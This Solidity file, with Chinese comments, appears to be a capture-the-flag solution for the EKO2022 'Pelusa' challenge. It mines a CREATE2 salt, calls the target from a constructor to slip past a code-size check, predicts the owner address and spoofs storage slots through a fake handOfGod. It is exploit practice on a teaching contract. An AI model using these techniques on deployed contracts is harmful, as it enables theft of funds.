// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Pelusa} from "../../src/eko2022/10_Pelusa/Pelusa.sol";

contract Pelusa_Attacker {
	address player;
	Pelusa pelusa;
	address deployer;
	
	constructor(Pelusa pelusa_, address deployer_) {
		player = msg.sender;
		pelusa = pelusa_;
		deployer = deployer_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		// 本次挑战明显又使用到了`合约字节码长度`
		// 虽然，cancun 升级后，合约自毁后，字节码长度仍然会维持原样(即，不会重置为0)
		// 但是，本次挑战使用到了`合约字节码长度`一个非常隐匿的特性
		// 即，在合约部署时，构造函数中，其自身字节码长度暂为0，属于一个中间状态!!!
		// 即，这种中间状态，可以让外界判断为`该地址为EOA`!!!
		
		// 简而言之：本挑战的关键在于深刻理解EVM中合约的生命周期：合约的代码只有在构造函数执行完毕后，才会被最终存储到链上状态中
		
		// 由于 Pelusa 合约的部署信息，理论上是公开的，这里就是直接计算它的 owner
		uint256 blockNum = block.number;
		address ownerPelusa = address(uint160(uint256(keccak256(abi.encodePacked(deployer, blockhash(blockNum))))));
		
		// 必须构建一个CREATE2的循环，来让即将部署成功的 PelusaAttacker 的地址，处于变化当中。
		Simulator simulatorContract;
		uint256 salt = 0;
		while(true) {
			address addr;
			bytes memory bytecode = type(Simulator).creationCode;
			bytes memory payload = abi.encodePacked(bytecode, abi.encode(address(pelusa), ownerPelusa));
			
			// 预测地址
			address predictedAdd = Create2Helper.computeCreate2Address(address(this), bytes32(salt),payload);
			if (uint256(uint160(predictedAdd)) % 100 != 10) {
				salt++;
				continue;
			}
			
			// 真实部署
			assembly {
				addr := create2(0, add(payload, 0x20), mload(payload), salt)
				if iszero(extcodesize(addr)) {
					revert(0, 0)
				}
			}
			
			require(predictedAdd == addr, "predictedAdd == addr");
			
			// 部署完成跳出
			simulatorContract = Simulator(addr);
			break;
		}
		require(address(simulatorContract) != address(0), "address(simulatorContract) != address(0)");
		
		pelusa.shoot();
	}
}

library Create2Helper {
	function computeCreate2Address(
		address deployer,
		bytes32 salt,
		bytes memory bytecodeWithArgs
	) external pure returns (address) {
		bytes32 hash = keccak256(
			abi.encodePacked(
				bytes1(0xff),
				deployer,
				salt,
				keccak256(bytecodeWithArgs)
			)
		);
		return address(uint160(uint256(hash)));
	}
}

contract Simulator {
	address internal player;    // 模拟相同的存储槽
	uint256 public goals = 1;   // 模拟相同的存储槽
	
	address pelusaAddress;
	address ownerPelusa;
	
	constructor(address pelusaAddress_, address ownerPelusa_) {
		require(address(this).code.length == 0);
		
		pelusaAddress = pelusaAddress_;
		ownerPelusa = ownerPelusa_;
		
		if (uint256(uint160(address(this))) % 100 == 10) {
			Pelusa(pelusaAddress).passTheBall();
		}
	}
	
	function getBallPossesion() external view returns (address) {
		return ownerPelusa;
	}
	
	function handOfGod() public returns(uint256) {
		goals = 2;
		return 22_06_1986;
	}
}
